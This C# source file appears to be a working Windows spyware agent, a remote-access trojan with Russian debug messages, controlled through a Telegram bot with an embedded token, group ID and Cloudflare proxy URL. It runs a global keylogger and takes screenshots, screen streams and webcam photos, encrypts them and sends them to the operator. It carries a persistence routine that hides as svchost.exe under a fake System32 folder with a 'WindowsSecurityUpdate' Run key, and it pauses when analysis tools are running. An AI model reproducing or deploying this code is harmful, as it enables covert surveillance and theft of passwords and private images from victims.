using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using Telegram.Bot;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using OpenCvSharp;
using Microsoft.Web.WebView2.WinForms;
using Microsoft.Web.WebView2.Core;

namespace Agent
{
    class Program
    {
        private static string _token = "9203119575:AAEmkVH7_VOL0cZelc6z8U_mFnKIw3Ldtjk";
        private static readonly long GroupId = -5468496599;
        private static readonly byte[] AesKey = Convert.FromBase64String("c2VjcmV0X2tleV9mb3JfdmFudGFfMTIzNDU2Nzg=");
        
        // ВАЖНО: ссылка должна быть с https:// и слэшем в конце!
        private static readonly string WorkerUrl = "https://telegram-proxy.ivanovicpavel295.workers.dev/"; 

        private static int _slot = 0;
        private static string _id = Guid.NewGuid().ToString("N").Substring(0, 8);
        private static TaskCompletionSource<int>? _grantTcs;

        private static TelegramBotClient _bot = null!;
        private static CancellationTokenSource? _streamCts;
        private static string _soundPath = "sound.wav";
        private static string _gifPath = "anim.gif";
        private static string _videoPath = "video.mp4";
        private static readonly string FramesDir = Path.Combine(Path.GetTempPath(), "svc_" + Guid.NewGuid().ToString("N"));
        private static readonly ManualResetEventSlim _pauseEvent = new(true);

        [STAThread]
        static async Task Main(string[] args)
        {
            Console.WriteLine("=== АГЕНТ ЗАПУЩЕН ===");
            Console.WriteLine("Нажми Enter, чтобы закрыть это окно...");

            // InstallPersistence(); // ВРЕМЕННО ОТКЛЮЧЕНО ДЛЯ ОТЛАДКИ
            Console.WriteLine("[Отладка] Установка и маскировка пропущены.");

            try
            {
                StartAntiAnalysis();
                Keylogger.Start();
                Console.WriteLine("[Отладка] Защита и кейлоггер запущены.");

                if (!string.IsNullOrEmpty(WorkerUrl))
                {
                    if (!WorkerUrl.StartsWith("http://") && !WorkerUrl.StartsWith("https://"))
                    {
                        Console.WriteLine("ФАТАЛЬНАЯ ОШИБКА: В WorkerUrl нет http:// или https:// !");
                        return;
                    }
                    var httpClient = new HttpClient { BaseAddress = new Uri(WorkerUrl) };
                    _bot = new TelegramBotClient(_token, httpClient);
                    Console.WriteLine("[Отладка] Бот инициализирован через Cloudflare Worker.");
                }
                else
                {
                    _bot = new TelegramBotClient(_token);
                    Console.WriteLine("[Отладка] Бот инициализирован напрямую.");
                }

                using var cts = new CancellationTokenSource();
                var opts = new ReceiverOptions { AllowedUpdates = new[] { UpdateType.Message } };
                
                _bot.StartReceiving(
                    updateHandler: Handle,
                    errorHandler: (bot, ex, ct) => 
                    {
                        Console.WriteLine($"[ОШИБКА СЕТИ] {ex.Message}");
                        Thread.Sleep(5000);
                        return Task.CompletedTask;
                    },
                    receiverOptions: opts,
                    cancellationToken: cts.Token);

                Console.WriteLine("[Отладка] Слушатель Telegram запущен. Ждем 2 сек...");
                await Task.Delay(2000);

                int preferred = File.Exists("slot.txt") && int.TryParse(File.ReadAllText("slot.txt").Trim(), out int p) ? p : 0;
                for (int attempt = 0; attempt < 5; attempt++) {
                    _grantTcs = new TaskCompletionSource<int>();
                    Console.WriteLine($"[Отладка] Попытка {attempt+1} отправить CLAIM {preferred} {_id}...");
                    try { 
                        await _bot.SendMessage(GroupId, $"CLAIM {preferred} {_id}"); 
                        Console.WriteLine("[Отладка] CLAIM отправлен успешно!");
                    } catch (Exception ex) { 
                        Console.WriteLine($"ОШИБКА ОТПРАВКИ CLAIM: {ex.Message}"); 
                    }
                    
                    var done = await Task.WhenAny(_grantTcs.Task, Task.Delay(3000));
                    if (done == _grantTcs.Task) { _slot = _grantTcs.Task.Result; break; }
                }
                if (_slot == 0) _slot = preferred > 0 ? preferred : 1;
                
                Console.WriteLine($"[Отладка] Мой слот: {_slot}");
                try { File.WriteAllText("slot.txt", _slot.ToString()); } catch { }
                try { await _bot.SendMessage(GroupId, $"REG {_slot}"); } catch { }
                Console.WriteLine("[Отладка] REG отправлен. Переход в рабочий режим.");

                _ = Task.Run(async () => {
                    while (true) {
                        try { await _bot.SendMessage(GroupId, $"PING {_slot} {_id}"); } catch { }
                        await Task.Delay(60000);
                    }
                });

                _ = Task.Run(async () => {
                    while (true) {
                        await Task.Delay(30000);
                        _pauseEvent.Wait();
                        string logs = Keylogger.Flush();
                        if (!string.IsNullOrWhiteSpace(logs)) {
                            try {
                                byte[] enc = Encrypt(Encoding.UTF8.GetBytes($"[{DateTime.Now:HH:mm:ss}]\n{logs}"));
                                using var ms = new MemoryStream(enc);
                                await _bot.SendDocument(GroupId, new InputFileStream(ms, $"l{_slot}.bin"));
                            } catch { }
                        }
                    }
                });

                Console.ReadLine(); // Держим окно открытым для отладки
            }
            catch (Exception ex) 
            { 
                Console.WriteLine("ФАТАЛЬНАЯ ОШИБКА: " + ex.ToString()); 
                Console.ReadLine(); 
            }
        }

        private static void InstallPersistence()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string folder = Path.Combine(appData, "Microsoft", "Windows", "System32");
                if (!Directory.Exists(folder)) Directory.CreateDirectory(folder);
                
                string currentExe = Process.GetCurrentProcess().MainModule!.FileName;
                string newExe = Path.Combine(folder, "svchost.exe");

                if (currentExe != newExe && File.Exists(currentExe))
                {
                    if (!File.Exists(newExe)) File.Copy(currentExe, newExe, true);
                }

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true)!)
                {
                    key.SetValue("WindowsSecurityUpdate", "\"" + newExe + "\"");
                }

                if (currentExe != newExe && File.Exists(newExe))
                {
                    Process.Start(new ProcessStartInfo { FileName = newExe, UseShellExecute = true });
                    try {
                        File.SetAttributes(currentExe, FileAttributes.Normal);
                        File.Delete(currentExe);
                    } catch { }
                    Environment.Exit(0);
                }
            }
            catch { }
        }

        private static void StartAntiAnalysis()
        {
            _ = Task.Run(() =>
            {
                string[] badProcesses = { "cmd", "powershell", "taskmgr", "processhacker", "procmon", "wireshark", "dnspy", "ilspy", "regedit" };
                while (true)
                {
                    try
                    {
                        bool found = false;
                        foreach (var p in Process.GetProcesses())
                        {
                            if (badProcesses.Contains(p.ProcessName.ToLower()))
                            {
                                found = true;
                                break;
                            }
                        }
                        if (found) _pauseEvent.Reset();
                        else _pauseEvent.Set();
                    }
                    catch { }
                    Thread.Sleep(500);
                }
            });
        }

        private static async Task Handle(ITelegramBotClient bot, Update upd, CancellationToken ct)
        {
            var msg = upd.Message;
            if (msg == null) return;

            if (msg.Text is string t)
            {
                if (t.StartsWith("GRANT ") && t.Contains(_id)) {
                    var parts = t.Split(' ');
                    if (parts.Length >= 3 && parts[1] == _id && int.TryParse(parts[2], out int s))
                        _grantTcs?.TrySetResult(s);
                    return;
                }

                switch (t) {
                    case var x when x == $"/stream_start {_slot}": StartStream(ct); break;
                    case var x when x == $"/stream_stop {_slot}" || x == $"/stop {_slot}": StopStream(); break;
                    case var x when x == $"/screen {_slot}": _ = SendScreen(ct); break;
                    case var x when x == $"/cam {_slot}": _ = SendCam(ct); break;
                    case var x when x == $"/sound {_slot}": if (File.Exists(_soundPath)) try { new SoundPlayer(_soundPath).Play(); } catch { } break;
                    case var x when x == $"/gif {_slot}": if (File.Exists(_gifPath)) ShowGif(_gifPath); break;
                    case var x when x == $"/video {_slot}": if (File.Exists(_videoPath)) ShowVideo(_videoPath); break;
                }
                return;
            }

            if (msg.Document is { } doc && msg.Caption == $"FOR {_slot}") {
                try {
                    var f = await bot.GetFile(doc.FileId, ct);
                    string target = doc.FileName switch {
                        "sound.bin" => _soundPath,
                        "anim.gif" => _gifPath,
                        "video.mp4" => _videoPath,
                        _ => _gifPath
                    };
                    using var fs = File.Create(target);
                    await bot.DownloadFile(f.FilePath!, fs, ct);
                } catch { }
            }
        }

        private static void ShowVideo(string path)
        {
            var thread = new Thread(() =>
            {
                var f = new Form
                {
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    TopMost = true,
                    BackColor = System.Drawing.Color.Black,
                    ShowInTaskbar = false
                };
                var webView = new WebView2 { Dock = DockStyle.Fill };
                f.Controls.Add(webView);
                
                f.Load += async (_, _) =>
                {
                    try {
                        var userDataFolder = Path.Combine(Path.GetTempPath(), "WV2_Cache");
                        var env = await CoreWebView2Environment.CreateAsync(null, userDataFolder);
                        await webView.EnsureCoreWebView2Async(env);
                        
                        string dir = Path.GetDirectoryName(path)!;
                        string file = Path.GetFileName(path);
                        webView.CoreWebView2.SetVirtualHostNameToFolderMapping("app.local", dir, CoreWebView2HostResourceAccessKind.Allow);
                        webView.CoreWebView2.Navigate($"https://app.local/{file}");
                    } catch { }
                };
                
                f.KeyDown += (_, e) => { if (e.KeyCode == Keys.Escape) f.Close(); };
                Application.Run(f);
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.IsBackground = true;
            thread.Start();
        }

        private static async Task SendCam(CancellationToken ct)
        {
            _pauseEvent.Wait();
            try {
                using var capture = new VideoCapture(0);
                if (capture.IsOpened()) {
                    using var frame = new Mat();
                    capture.Read(frame);
                    if (!frame.Empty()) {
                        Cv2.ImEncode(".jpg", frame, out byte[] jpg);
                        byte[] enc = Encrypt(jpg);
                        using var ms = new MemoryStream(enc);
                        await _bot.SendDocument(GroupId, new InputFileStream(ms, $"c{_slot}.bin"), cancellationToken: ct);
                    }
                }
            } catch { }
        }

        private static async void StartStream(CancellationToken ct)
        {
            StopStream();
            Directory.CreateDirectory(FramesDir);
            _streamCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            var token = _streamCts.Token;
            _ = Task.Run(async () => {
                int i = 0;
                while (!token.IsCancellationRequested) {
                    _pauseEvent.Wait();
                    try {
                        string framePath = Path.Combine(FramesDir, $"f_{i++:D6}.png");
                        byte[] png = CaptureScreen();
                        await File.WriteAllBytesAsync(framePath, png, token);
                        byte[] enc = Encrypt(png);
                        using var ms = new MemoryStream(enc);
                        await _bot.SendDocument(GroupId, new InputFileStream(ms, $"s{_slot}.bin"), cancellationToken: token);
                    } catch { }
                    try { await Task.Delay(1000, token); } catch { break; }
                }
            }, token);
        }

        private static void StopStream()
        {
            try { _streamCts?.Cancel(); } catch { }
            _streamCts = null;
            WipeFrames();
        }

        private static void WipeFrames()
        {
            try {
                if (Directory.Exists(FramesDir)) {
                    foreach (var f in Directory.GetFiles(FramesDir)) try { File.Delete(f); } catch { }
                    try { Directory.Delete(FramesDir, true); } catch { }
                }
            } catch { }
        }

        private static async Task SendScreen(CancellationToken ct)
        {
            _pauseEvent.Wait();
            try {
                byte[] enc = Encrypt(CaptureScreen());
                using var ms = new MemoryStream(enc);
                await _bot.SendDocument(GroupId, new InputFileStream(ms, $"s{_slot}.bin"), cancellationToken: ct);
            } catch { }
        }

        private static byte[] CaptureScreen()
        {
            var b = Screen.PrimaryScreen!.Bounds;
            using var bmp = new Bitmap(b.Width, b.Height);
            using (var g = Graphics.FromImage(bmp)) g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, b.Size);
            using var ms = new MemoryStream();
            bmp.Save(ms, ImageFormat.Png);
            return ms.ToArray();
        }

        private static void ShowGif(string path)
        {
            var thread = new Thread(() => {
                var f = new Form {
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    TopMost = true,
                    BackColor = System.Drawing.Color.Black,
                    ShowInTaskbar = false
                };
                var pb = new PictureBox { Image = Image.FromFile(path), SizeMode = PictureBoxSizeMode.Zoom, Dock = DockStyle.Fill };
                f.Controls.Add(pb);
                f.KeyDown += (_, e) => { if (e.KeyCode == Keys.Escape) f.Close(); };
                Application.Run(f);
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.IsBackground = true;
            thread.Start();
        }

        private static byte[] Encrypt(byte[] plain)
        {
            using var aes = new AesGcm(AesKey, 16);
            byte[] nonce = new byte[12]; RandomNumberGenerator.Fill(nonce);
            byte[] cipher = new byte[plain.Length]; byte[] tag = new byte[16];
            aes.Encrypt(nonce, plain, cipher, tag);
            byte[] result = new byte[28 + cipher.Length];
            Buffer.BlockCopy(nonce, 0, result, 0, 12);
            Buffer.BlockCopy(tag, 0, result, 12, 16);
            Buffer.BlockCopy(cipher, 0, result, 28, cipher.Length);
            return result;
        }
    }

    public static class Keylogger
    {
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static readonly StringBuilder _buffer = new();
        private static readonly object _lock = new();

        public static void Start() { 
            using var p = Process.GetCurrentProcess(); 
            using var m = p.MainModule!; 
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(m.ModuleName), 0); 
        }
        
        private static IntPtr HookCallback(int n, IntPtr w, IntPtr l) {
            if (n >= 0 && w == (IntPtr)WM_KEYDOWN) { 
                int vk = Marshal.ReadInt32(l); 
                lock (_lock) _buffer.Append(Translate(vk)); 
            }
            return CallNextHookEx(_hookID, n, w, l);
        }
        
        public static string Flush() { 
            lock (_lock) { 
                var s = _buffer.ToString(); 
                _buffer.Clear(); 
                return s; 
            } 
        }
        
        private static string Translate(int vk) {
            Keys k = (Keys)vk;
            if (k >= Keys.A && k <= Keys.Z) return ((char)('a' + (k - Keys.A))).ToString();
            if (k >= Keys.D0 && k <= Keys.D9) return ((char)('0' + (k - Keys.D0))).ToString();
            if (k == Keys.Space) return " ";
            if (k == Keys.Enter) return "\n";
            if (k == Keys.Back) return "[<]";
            return "";
        }
    }
}
